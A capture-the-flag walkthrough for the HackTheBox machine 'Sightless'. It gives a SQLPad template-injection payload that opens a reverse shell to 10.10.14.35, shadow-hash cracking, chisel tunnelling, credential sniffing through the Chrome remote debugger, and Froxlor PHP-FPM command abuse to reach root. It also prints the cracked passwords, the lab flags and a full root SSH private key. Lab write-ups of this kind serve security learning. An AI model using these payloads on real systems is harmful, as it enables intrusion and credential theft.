

![[Pasted image 20240911112935.png]]

Start with initial `NMAP` scan

![[Pasted image 20240911113103.png]]

There are 3 ports up and running `FTP` & `SSH` & `HTTP` running on their respective `21`,`22` & `80` ports.

![[Pasted image 20240911113810.png]]


When you enter the Ip in browser it will redirect you to `sightless.htb` so inorder to access it , add the ip and domain name in local dns file (`/etc/hosts`)

Now lets visit the webpage running on port `80` again.
![[Pasted image 20240914112345.png]]

We can learn potentially vital information for exploiting alternative channels or finding system vulnerabilities by carefully examining the HTTP service. However, after rummaging through the webpage and its sections, the available services is `sqlpad` which whenb clicked upon redirects to `sqlpad.sightless.htb`. To access the service we need to add it the domain `sqlpad.sightless.htb` into the local dns file.

![[Pasted image 20240914113943.png]]

A vital part of handling database interactions is the SQLPad component that connects to the database and performs commands using the database user's password. This part makes sure SQLPad can connect to the database and authenticate users, so they can safely run queries, get data, and manage database resources. It creates a secure connection using the database user credentials, allowing the platform to execute SQL instructions without any issues.

![[Pasted image 20240914114540.png]]

As per BurpSuite, the SQLPad version that is currently installed is 6.10.0. The current version is impacted by [CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944).

Lets upload the payload by creating a new connection.
To establish a new connection, follow these steps:

1. **Click on “Connection”**: Start by navigating to the “Connection” menu to begin the setup.
2. **Create a New Connection**: Select “New Connection” to initiate a fresh connection configuration.
3. **Choose MySQL as the Database**: In the list of available database options, select MySQL as your preferred database type.
4. **Enter the Payload into the Database**: Input the required payload or credentials in the appropriate fields to configure the database connection.
5. **Test the Connection**: Execute a test run of the connection settings by running a command to ensure the configuration is correct and the connection is successful.

Then write a `payload` and paste it in `database` field of new connection.

![[Pasted image 20240914133931.png]]

```shell
{{process.mainModule.require('child_process').exec('bash -c "bash -i >& 
 /dev/tcp/10.10.14.35/5555 0>&1"') }}
```

Start a netcat listener to capture the reverse shell before saving the connection. Once you done it and click on save you will get the shell running directly with root access.

![[Pasted image 20240914132057.png]]

Upon closer inspection, I discovered that the `.dockerenv` file is present, thereby validating that the application operates within a Docker container.

![[Pasted image 20240914132347.png]]

Furthermore, upon examining the system's users, I detected two accounts: one associated with `michael` and another with `node`. This information indicates that the application may operate under one of these user contexts, potentially offering avenues for future exploitation.

![[Pasted image 20240914132515.png]]

Subsequently, I examined the `shadow` file. This file contains confidential information regarding user passwords and their related attributes. Accessing this file necessitates appropriate authentication and authorization. Upon logging in, you may access the directory containing the shadow file and examine its contents.

![[Pasted image 20240914132839.png]]

Here we found `Michael` password's hash value. You can use `hashcat` or `johntheripper` to decrypt the following hash value.

```shell
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt michael.txt
``` 

![[Pasted image 20240914134809.png]]

The password is `insaneclownposse`

Now, We can use the following username  and password `michael:insanceclownposse` to connect to the `ssh` port.

![[Pasted image 20240914135208.png]]

We can the `user.txt` file which contains the user flag.

![[Pasted image 20240914135324.png]]

```
0021feba903a03ad33e73d19360cb488
```

After rummaging again in the michael's shell. I checked upon the network connections on the machine.There is a suspicious port, 8080, that needs to be investigated. To do this, you should forward the traffic from port 8080 to your local computer. This will allow you to examine the data and determine whether any unusual activities are taking place

![[Pasted image 20240914140621.png]]

So, I can use ssh or chisel to port forward but ssh port forwarding doesn't quite work. So I
utilized chisel.

Run this on your local machine.
```bash
chisel server -p 6666 --reverse
```

Then run this on the `ssh` terminal
```bash
./chisel client 10.10.14.35:6666 R:8080:127.0.0.1:8080
```

![[Pasted image 20240914141717.png]]

After visiting the service through our ip wecan find that `froxlor` is running on port `8080`

![[Pasted image 20240914141915.png]]

To begin, run `netstat -tnlp` on Michael’s machine to list all the active network connections and listening ports. Identify all the open ports and forward all of them except the ones that have only two digits.

Use the following SSH command to set up port forwarding for each identified port:

```
ssh -L 42253:127.0.0.1:42253 michael@10.110.192.10
```

Add all the relevant ports to the command.

Next, open Google Chrome and navigate to `chrome://inspect/#devices`. Click on “Configure” and add each port as `127.0.0.1:<port_number>`, repeating this step until a connection appears. Once you see a connection pop up, click on “Inspect” to open a new window.

In this new window, switch to the “Network” tab and wait for Michael to log in. Monitor the traffic and locate `index.php` to find the credentials required to access the login portal on `127.0.0.1:8080`. Use these credentials to log in.

```
admin:ForlorfroxAdmin
```

![[Pasted image 20240914153942.png]]


Upon login in, proceed to the “PHP” section, then select “PHP-FPM versions” and initiate the creation of a new version. Enter the subsequent command in the PHP-FPM restart command field
![[Pasted image 20240914154314.png]]

```bash
cp /root/root.txt /tmp/root.txt
```

![[Pasted image 20240914154713.png]]


Now save the connection and then go to `http://10.10.14.35:8080/admin_settings.php?page=overview&part=phpfpm` and disable the `PHP-FPM` and save changes ,then again re-enable it and save again. This process will trigger the execution of copy command.

Once it is done go to `michael` shell and check it.

![[Pasted image 20240914155419.png]]

The root flag is

```
0db55f72dc2dc6df0a08a5646f3ad56f
```

#### Note

There is one another way to do this instead of copying `root.txt` into `/tmp` you can root user's `id_rsa` key and get the flag. To do that change the command in `PHP-FPM` to

```
cp /root/.ssh/id_rsa /tmp/id_rsa
```

![[Pasted image 20240914160047.png]]

After disabling and then re-enabling the `PHP-FPM`. You can find the `id_rsa` in temp folder.

![[Pasted image 20240914160800.png]]

Then lo in to the root user from the same shell using `ssh` and you can get the root flag

```shell
ssh -i id_rsa root@10.10.11.32
```

Once you login go to root directory and `cat` the `root.txt` file.

Depending on your patience you can go for either way.


![[Pasted image 20240914162601.png]]


#### References

1. SQLPad v6.10.0 `CVE-2022-0944` [link](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

2. Chrome Remote Debugger [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

Misc Files:

root : id_rsa

```text
----BEGIN OPENSSH PRIVATE KEY-----  
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  
----END OPENSSH PRIVATE KEY-----
```